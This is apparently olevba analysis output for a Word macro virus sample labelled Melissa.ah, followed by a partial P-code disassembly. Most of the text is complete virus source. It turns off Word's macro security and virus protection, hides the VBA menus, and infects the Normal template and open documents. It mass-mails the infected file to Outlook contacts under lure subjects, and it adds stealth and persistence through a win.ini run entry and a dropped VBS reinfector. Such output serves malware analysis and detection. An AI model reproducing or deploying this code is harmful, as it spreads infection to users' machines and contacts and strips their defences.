olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Melissa.ah
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Empirical.cls 
in file: ./Virus.MSWord.Melissa.ah - OLE stream: 'Macros/VBA/Empirical'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
  On Error Resume Next
  Call Empirical
End Sub
Private Sub Document_New()
  On Error Resume Next
  Call Empirical
End Sub
Private Sub AutoExec()
  On Error Resume Next
  Call Empirical
End Sub
Private Sub Empirical()
  'based on or guided by experience,
  'experiment or observation,
  'as distinct from theory.
  On Error Resume Next
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
  End If
  CommandBars("Visual Basic").Enabled = False

  Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
  Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
  NTCL = NTI1.CodeModule.countoflines
  ADCL = ADI1.CodeModule.countoflines
  BGN = 2

  If ADI1.Name <> "Empirical" Or ADCL < 20 Then
    If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
    Set toinfect = ADI1
    ADI1.Name = "Empirical"
    DoAD = True
  End If

  If NTI1.Name <> "Empirical" Or NTCL < 20 Then
    If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
    Set toinfect = NTI1
    NTI1.Name = "Empirical"
    DoNT = True
  End If

  If DoNT <> True And DoAD <> True Then GoTo BYE

  If DoNT = True Then
    toinfect.CodeModule.addfromstring ("Private Sub Document_Open()" & vbCrLf & ADI1.CodeModule.Lines(2, ADI1.CodeModule.countoflines))
  End If

  If DoAD = True Then
    toinfect.CodeModule.addfromstring ("Private Sub Document_Close()" & vbCrLf & NTI1.CodeModule.Lines(2, NTI1.CodeModule.countoflines))
  End If

BYE:
  Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
  Set UngaDasOutlook = CreateObject("Outlook.Application")
  Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Profiles") <> "Empirical" Then
    If UngaDasOutlook = "Outlook" Then
      DasMapiName.Logon "profile", "password"
      For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
          Peep = AddyBook.AddressEntries(x)
          BreakUmOffASlice.Recipients.Add Peep
          x = x + 1
          If x > 50 Then oo = AddyBook.AddressEntries.Count
        Next oo
        s = Int(Rnd * 7)
        Select Case s
          Case 0
            BreakUmOffASlice.Subject = "Question for you..."
            BreakUmOffASlice.Body = "It's fairly complicated so I've attached it."
          Case 1
            BreakUmOffASlice.Subject = "Check this!!"
            BreakUmOffASlice.Body = "This is some wicked stuff!"
          Case 2
            BreakUmOffASlice.Subject = "Cool Web Sites"
            BreakUmOffASlice.Body = "Check out the Attached Document for a list of some of the best Sites on the Web"
          Case 3
            BreakUmOffASlice.Subject = "80mb Free Web Space!"
            BreakUmOffASlice.Body = "Check out the Attached Document for details on how to obtain the free space.  It's cool, I've now got heaps of room."
          Case 4
            BreakUmOffASlice.Subject = "Cheap Software"
            BreakUmOffASlice.Body = "The attached document contains a list of web sites where you can obtain Cheap Software"
          Case 5
            BreakUmOffASlice.Subject = " Cheap Hardware"
            BreakUmOffASlice.Body = " I've attached a list of web sites where you can obtain Cheap Hardware"
          Case 6
            BreakUmOffASlice.Subject = "Free Music"
            BreakUmOffASlice.Body = " Here is a list of places where you can obtain Free Music."
          Case 7
            s1 = Int(Rnd * 126) + 32
            BreakUmOffASlice.Subject = Chr$(s1) & " Free Downloads"
            BreakUmOffASlice.Body = " Here is a list of sites where you can obtain Free Downloads."
        End Select
        BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
        BreakUmOffASlice.Send
        Peep = ""
      Next y
    DasMapiName.Logoff
    End If
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Profiles") = "Empirical"
  End If
  
  If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
  ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
    ActiveDocument.Saved = True
  End If
  If Minute(Now) = Hour(Now) Then Selection.TypeText " All empires fall, you just have to know where to push. ": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True:  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Profiles") = ""
End Sub




























































-------------------------------------------------------------------------------
VBA MACRO Module.bas 
in file: ./Virus.MSWord.Melissa.ah - OLE stream: 'Macros/VBA/Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

'MyName = Overlord
'WrittenBy = f0re [UC/Skamwerks/DVC]
'Version = .B (1.1)

On Error Resume Next

windir = Environ("windir")
If Dir(windir & "\tempad.dll") <> "" Then Kill (windir & "\tempad.dll")
If Dir(windir & "\tempnt.dll") <> "" Then Kill (windir & "\tempnt.dll")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

If NormalTemplate.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
ActiveDocument.VBProject.VBComponents("Module").Export (windir & "\tempad.dll")
NormalTemplate.VBProject.VBComponents.import (windir & "\tempad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\tempnt.dll")
ActiveDocument.VBProject.VBComponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

If Dir("c:\Himem.sys") <> "" Then
Open "c:\Himem.sys" For Input As #1
Open "c:\Himem.sy_" For Output As #2
Do While Not EOF(1)
 Input #1, Line
 If Line <> ActiveDocument.FullName Then Print #2, Line
Loop
Close #1
Close #2

Kill ("c:\Himem.sys")
FileCopy "c:\Himem.sy_", "c:\Himem.sys"
Kill ("c:\Himem.sy_")
End If

End Sub
Sub AutoOpen()

On Error Resume Next
windir = Environ("windir")

Open "c:\Himem.sys" For Append As #1
Print #1, ActiveDocument.FullName
Close #1

End Sub

Sub Stealth()
On Error Resume Next

windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\", "RegisteredOwner") = "the Overlord"

Open windir & "\win.ini" For Input As #1
Open "c:\win._ni" For Output As #2
Do While Not EOF(1)
 Line Input #1, Line
 If Line = "[windows]" Then
  Print #2, Line
  Print #2, "run = " & windir & "\overlord.b.vbs"
 Else
  Print #2, Line
 End If
Loop
Close #1
Close #2

FileCopy "c:\win._ni", windir & "\win.ini"
Kill ("c:\win._ni")

If Dir(windir & "\overlord.b.vbs") <> "" Then Kill (windir & "\overlord.b.vbs")

Open "c:\windows\overlord.b.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, ""
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\overlord.b.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, ""
Print #1, "Dim FSO"
Print #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.sys" & Chr(34) & ", 1, True)"
Print #1, "contents = a.readall()"
Print #1, "a.close"
Print #1, "set b =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 2, True)"
Print #1, "b.write(contents)"
Print #1, "b.close"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 1, True)"
Print #1, "Do While a.atendofstream <> True"
Print #1, "documentname = a.readline"
Print #1, "If documentname <> " & Chr(34) & Chr(34) & " then"
Print #1, "WordObj.Documents.open (documentname)"
Print #1, "WordObj.activedocument.save"
Print #1, "WordObj.activedocument.close"
Print #1, "End if"
Print #1, "Loop"
Print #1, "a.close"
Print #1, "set NT = " & Chr(34) & Chr(34)
Print #1, "WordObj.Quit"
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.sys" & Chr(34)
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.dll" & Chr(34)
Close #1

NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\overlord.b.dll")

End Sub
Sub ViewVBCode()
On Error Resume Next

Call Stealth

NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.countoflines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Module")
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
For x = 1 To Docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.countoflines
Documents(x).Saved = True
Documents(x).VBProject.VBComponents.Remove Documents(x).VBProject.VBComponents("Module")
Documents(x).Saved = True
Next x
End If

Application.ShowVisualBasicEditor = True

End Sub
Sub ToolsMacro()
On Error Resume Next

For x = 1 To NormalTemplate.VBProject.VBComponents("Module").CodeModule.countoflines
 codeNT = codeNT & NormalTemplate.VBProject.VBComponents("Module").CodeModule.Lines(x, 1) & Chr(13)
Next x
NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.countoflines
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
 For y = 1 To ActiveDocument.VBProject.VBComponents("Module").CodeModule.countoflines
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Module").CodeModule.Lines(y, 1) & Chr(13)
 Next y
 For x = 1 To Docnumber
 Documents(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.countoflines
 Documents(x).Saved = True
 Next x
End If

Application.Dialogs(wdDialogToolsMacro).Show

If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("Module").CodeModule.InsertLines 1, codeNT
 NormalTemplate.Save
 
If Docnumber >= 1 Then
For x = 1 To Docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.InsertLines 1, CodeAD
Documents(x).SaveAs Documents(x).FullName
Next x
End If
End If
End Sub

'Put this code in a module called "Module". This is another version of overlord.
'It uses a different stealth mechanism. Again however not perfect stealth,
'but perhaps also a nice attempt i hope :).




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Melissa.ah
' ===============================================================================
' Module streams:
' Macros/VBA/Empirical - 9296 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	ArgsCall (Call) Empirical 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub Document_New())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	ArgsCall (Call) Empirical 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Private Sub AutoExec())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	ArgsCall (Call) Empirical 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Sub Empirical())
' Line #13:
' 	QuoteRem 0x0002 0x0021 "based on or guided by experience,"
' Line #14:
' 	QuoteRem 0x0002 0x001A "experiment or observation,"
' Line #15:
' 	QuoteRem 0x0002 0x0018 "as distinct from theory."
' Line #16:
' 	OnError (Resume Next) 
' Line #17:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #18:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #19:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #25:
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #27:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #28:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St NTCL 
' Line #29:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ADCL 
' Line #30:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #31:
' Line #32:
' 	Ld ADI1 
' 	MemLd New 
' 	LitStr 0x0009 "Empirical"
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0014 
' 	Lt 
' 	Or 
' 	IfBlock 
' Line #33:
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #34:
' 	SetStmt 
' 	Ld ADI1 
' 	Set toinfect 
' Line #35:
' 	LitStr 0x0009 "Empirical"
' 	Ld ADI1 
' 	MemSt New 
' Line #36:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Ld NTI1 
' 	MemLd New 
' 	LitStr 0x0009 "Empirical"
' 	Ne 
' 	Ld NTCL 
' 	LitDI2 0x0014 
' 	Lt 
' 	Or 
' 	IfBlock 
' Line #40:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #41:
' 	SetStmt 
' 	Ld NTI1 
' 	Set toinfect 
' Line #42:
' 	LitStr 0x0009 "Empirical"
' 	Ld NTI1 
' 	MemSt New 
' Line #43:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo BYE 
' 	EndIf 
' Line #47:
' Line #48:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #49:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCrLf 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld toinfect 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #50:
' 	EndIfBlock 
' Line #51:
' Line #52:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCrLf 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld toinfect 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #54:
' 	EndIfBlock 
' Line #55:
' Line #56:
' 	Label BYE 
' Line #57:
' 	Dim 
' 	VarDefn UngaDasOutlook
' 	VarDefn DasMapiName
' 	VarDefn BreakUmOffASlice
' Line #58:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set UngaDasOutlook 
' Line #59:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld UngaDasOutlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set DasMapiName 
' Line #60:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "Profiles"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0009 "Empirical"
' 	Ne 
' 	IfBlock 
' Line #61:
' 	Ld UngaDasOutlook 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #62:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld DasMapiName 
' 	ArgsMemCall Logon 0x0002 
' Line #63:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DasMapiName 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #64:
' 	SetStmt 
' 	Ld y 
' 	Ld DasMapiName 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #65:
' 	LitDI2 0x0001 
' 	St x 
' Line #66:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld UngaDasOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set BreakUmOffASlice 
' Line #67:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #68:
' 	Ld x 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #69:
' 	Ld Peep 
' 	Ld BreakUmOffASlice 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #70:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #71:
' 	Ld x 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #72:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' 	Ld Rnd 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	St s 
' Line #74:
' 	Ld s 
' 	SelectCase 
' Line #75:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #76:
' 	LitStr 0x0013 "Question for you..."
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #77:
' 	LitStr 0x002C "It's fairly complicated so I've attached it."
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #78:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #79:
' 	LitStr 0x000C "Check this!!"
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #80:
' 	LitStr 0x001A "This is some wicked stuff!"
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #81:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #82:
' 	LitStr 0x000E "Cool Web Sites"
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #83:
' 	LitStr 0x004F "Check out the Attached Document for a list of some of the best Sites on the Web"
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #84:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #85:
' 	LitStr 0x0014 "80mb Free Web Space!"
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #86:
' 	LitStr 0x0074 "Check out the Attached Document for details on how to obtain the free space.  It's cool, I've now got heaps of room."
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #87:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #88:
' 	LitStr 0x000E "Cheap Software"
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #89:
' 	LitStr 0x0056 "The attached document contains a list of web sites where you can obtain Cheap Software"
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #90:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #91:
' 	LitStr 0x000F " Cheap Hardware"
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #92:
' 	LitStr 0x0046 " I've attached a list of web sites where you can obtain Cheap Hardware"
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #93:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #94:
' 	LitStr 0x000A "Free Music"
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #95:
' 	LitStr 0x003A " Here is a list of places where you can obtain Free Music."
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #96:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #97:
' 	Ld Rnd 
' 	LitDI2 0x007E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0020 
' 	Add 
' 	St s1 
' Line #98:
' 	Ld s1 
' 	ArgsLd Chr$ 0x0001 
' 	LitStr 0x000F " Free Downloads"
' 	Concat 
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #99:
' 	LitStr 0x003D " Here is a list of sites where you can obtain Free Downloads."
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #100:
' 	EndSelect 
' Line #101:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld BreakUmOffASlice 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #102:
' 	Ld BreakUmOffASlice 
' 	ArgsMemCall Send 0x0000 
' Line #103:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #104:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	Ld DasMapiName 
' 	ArgsMemCall Logoff 0x0000 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	LitStr 0x0009 "Empirical"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "Profiles"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #108:
' 	EndIfBlock 
' Line #109:
' Line #110:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #111:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #112:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #113:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0038 " All empires fall, you just have to know where to push. "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x00C8 
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "Profiles"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Macros/VBA/Module - 11125 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0011 "MyName = Overlord"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "WrittenBy = f0re [UC/Skamwerks/DVC]"
' Line #4:
' 	QuoteRem 0x0000 0x0012 "Version = .B (1.1)"
' Line #5:
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' Line #8:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #9:
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #10:
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #11:
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' Line #16:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "'MyName = Overlord"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
